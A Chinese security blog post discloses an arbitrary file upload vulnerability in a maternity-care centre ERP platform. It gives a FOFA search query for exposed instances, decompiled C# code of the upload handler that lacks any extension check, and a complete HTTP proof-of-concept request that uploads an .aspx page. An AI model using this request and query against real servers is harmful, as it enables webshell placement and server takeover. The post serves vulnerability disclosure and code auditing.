---
title: "月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ModuleUpHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-moduleuphandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/24 08:46
- 659浏览
- [0评论](#comment)
- 1小时阅读

深入探索

JSON处理工具

企业安全咨询

传输层安全性协议

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/upload/ModuleUpHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

漏洞扫描服务

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

ModuleUpHandler 的业务逻辑实现如下

```
public class ModuleUpHandler : IHttpHandler
  {
    private static string OOsUrl = ConfigurationManager.AppSettings["uploadOosUrl"];
    private static string url = "";
    private static string Slturl = "";
    private static string ErpUrl = ConfigurationManager.AppSettings["uploadErpUrl"];
    private static string UploadPosition = ConfigurationManager.AppSettings[nameof (UploadPosition)];
    private static string BdSltUrl = "UploadBaseFolder/Thumbnail";
    private static string BdYtUrl = "UploadBaseFolder";

    public void ProcessRequest(HttpContext context)
    {
      context.Response.ContentType = "application/json";
      HttpFileCollection files = context.Request.Files;
      Framework.Common.Logging.Logging.SaveLog(ELogLayer.UI, "Files数量：" + ((NameObjectCollectionBase) context.Request.Files).Count.ToString());
      List<string> stringList = new List<string>();
      if (string.op_Equality(ModuleUpHandler.UploadPosition, "1"))
      {
        ModuleUpHandler.url = ModuleUpHandler.OOsUrl + "/" + DateTime.Now.ToString("yyyyMM");
      }
      else
      {
        ModuleUpHandler.url = ModuleUpHandler.ErpUrl + "/" + DateTime.Now.ToString("yyyyMM");
        ModuleUpHandler.Slturl = ModuleUpHandler.BdSltUrl + "/" + ModuleUpHandler.ErpUrl + "/" + DateTime.Now.ToString("yyyyMM") + "/";
      }
      if (((NameObjectCollectionBase) context.Request.Files).Count > 0)
      {
        string str1 = ModuleUpHandler.BdYtUrl + "/" + ModuleUpHandler.url;
        string str2 = context.Server.MapPath("../../" + str1);
        if (!Directory.Exists(str2))
          Directory.CreateDirectory(str2);
        for (int index = 0; index < ((NameObjectCollectionBase) context.Request.Files).Count; ++index)
        {
          HttpPostedFile httpPostedFile = files[index];
          string fileName = httpPostedFile.FileName;
          string lower = fileName.Substring(fileName.LastIndexOf(".")).ToLower();
          string newName = this.GetNewName(lower);
          if (string.op_Equality(ModuleUpHandler.UploadPosition, "1"))
          {
            stringList.Add(string.Format("{0}/{1},1", (object) ModuleUpHandler.url, (object) newName));
            Stream inputStream = files[index].InputStream;
            OosUpload.PutObjectFromFile(ModuleUpHandler.url + "/", newName, inputStream);
          }
          else
          {
            stringList.Add(string.Format("{0}/{1},0", (object) str1, (object) newName));
            string originalImagePath = string.Format("{0}/{1}", (object) str2, (object) newName);
            string str3 = context.Server.MapPath("../../" + ModuleUpHandler.Slturl);
            httpPostedFile.SaveAs(originalImagePath);
            if (string.op_Equality(lower, ".png") || string.op_Equality(lower, ".jpg") || string.op_Equality(lower, ".jepg") || string.op_Equality(lower, ".bmp"))
            {
              if (!Directory.Exists(str3))
                Directory.CreateDirectory(str3);
              string thumbnailPath = string.Format("{0}/{1}", (object) str3, (object) newName);
              ModuleUpHandler.MakeThumbnail(originalImagePath, thumbnailPath, 120, 120, "DB");
            }
          }
          Thread.Sleep(1000);
        }
      }
      context.Response.Write(JsonConvert.SerializeObject((object) new
      {
        code = 200,
        data = stringList
      }));
      context.Response.End();
    }

    public string GetNewName(string name)
    {
      return DateTime.UtcNow.ToString("yyyyMMddHHmmss") + new Random().Next(0, 9999999).ToString() + name;
    }

    public static void MakeThumbnail(
      string originalImagePath,
      string thumbnailPath,
      int width,
      int height,
      string mode)
    {
      Image image1 = Image.FromFile(originalImagePath);
      int num1 = width;
      int num2 = height;
      int num3 = 0;
      int num4 = 0;
      int num5 = image1.Width;
      int num6 = image1.Height;
      if (!string.op_Equality(mode, "HW"))
      {
        if (!string.op_Equality(mode, "W"))
        {
          if (!string.op_Equality(mode, "H"))
          {
            if (!string.op_Equality(mode, "Cut"))
            {
              if (string.op_Equality(mode, "DB"))
              {
                if ((double) image1.Width / (double) num1 < (double) image1.Height / (double) num2)
                {
                  num2 = height;
                  num1 = image1.Width * height / image1.Height;
                }
                else
                {
                  num1 = width;
                  num2 = image1.Height * width / image1.Width;
                }
              }
            }
            else if ((double) image1.Width / (double) image1.Height > (double) num1 / (double) num2)
            {
              num6 = image1.Height;
              num5 = image1.Height * num1 / num2;
              num4 = 0;
              num3 = (image1.Width - num5) / 2;
            }
            else
            {
              num5 = image1.Width;
              num6 = image1.Width * height / num1;
              num3 = 0;
              num4 = (image1.Height - num6) / 2;
            }
          }
          else
            num1 = image1.Width * height / image1.Height;
        }
        else
          num2 = image1.Height * width / image1.Width;
      }
      Image image2 = (Image) new Bitmap(num1, num2);
      Graphics graphics = Graphics.FromImage(image2);
      graphics.InterpolationMode = (InterpolationMode) 2;
      graphics.SmoothingMode = (SmoothingMode) 2;
      graphics.Clear(Color.Transparent);
      graphics.DrawImage(image1, new Rectangle(0, 0, num1, num2), new Rectangle(num3, num4, num5, num6), (GraphicsUnit) 2);
      try
      {
        image2.Save(thumbnailPath, ImageFormat.Png);
      }
      catch (Exception ex)
      {
        throw ex;
      }
      finally
      {
        image1.Dispose();
        image2.Dispose();
        graphics.Dispose();
      }
    }

    public bool IsReusable => false;
  }
```

### 处理流程逻辑梳理

1. **设置响应类型**：设置 `context.Response.ContentType` 为 `application/json`。
2. **获取上传的文件集合**：从 `context.Request.Files` 获取上传的文件集合。
3. **记录日志**：记录上传文件的数量到日志。
4. **判断上传位置**：
   - 如果 `UploadPosition` 为 `"1"`：
     - 设置 `url` 为 `OOsUrl` 加上当前年月。
   - 否则：
     - 设置 `url` 为 `ErpUrl` 加上当前年月。
     - 设置 `Slturl` 为 `BdSltUrl` 加上 `ErpUrl` 和当前年月。
5. **判断是否有文件上传**：
   - 如果有文件：
     - 构造上传文件的存储路径 `str1` 和物理路径 `str2`。
     - 如果 `str2` 路径不存在，则创建目录。
     - 遍历上传的文件集合：
     - 获取文件名及扩展名。
     - 调用 `GetNewName` 方法生成新的文件名。
     - 根据 `UploadPosition` 决定处理方式：
       - 如果 `UploadPosition` 为 `"1"`：
       - 调用 `OosUpload.PutObjectFromFile` 方法上传文件到对象存储。
       - 将文件路径和标识 `"1"` 添加到 `stringList`。
       - 否则：
       - 保存文件到本地路径。
       - 如果文件是图片类型（`.png`, `.jpg`, `.jpeg`, `.bmp`），生成缩略图：
         - 如果缩略图路径不存在，则创建目录。
         - 调用 `MakeThumbnail` 方法生成缩略图。
       - 将文件路径和标识 `"0"` 添加到 `stringList`。
     - 每处理一个文件，线程休眠 1 秒。
6. **返回响应**：
   - 将 `stringList` 转换为 JSON 格式，返回到客户端，状态码为 `200`。
   - 结束响应。

---

也是常规的上传、重命名、对图片后缀进行缩略图处理等，并无特殊后缀过滤，且会回显上传文件路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/upload/ModuleUpHandler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 ModuleUpHandler.ashx 任意文件上传漏洞](images/img-001-2122d87282a6.webp)](https://image.mrxn.net/3f3cb10c56864671a86c03be35f431b0.webp)

成功上传测试POC并回显文件路径，且响应里最后的 0 也表明上传至本地，否则为远程对象储存。

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [3.1.处理流程逻辑梳理](#toc-3-1-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
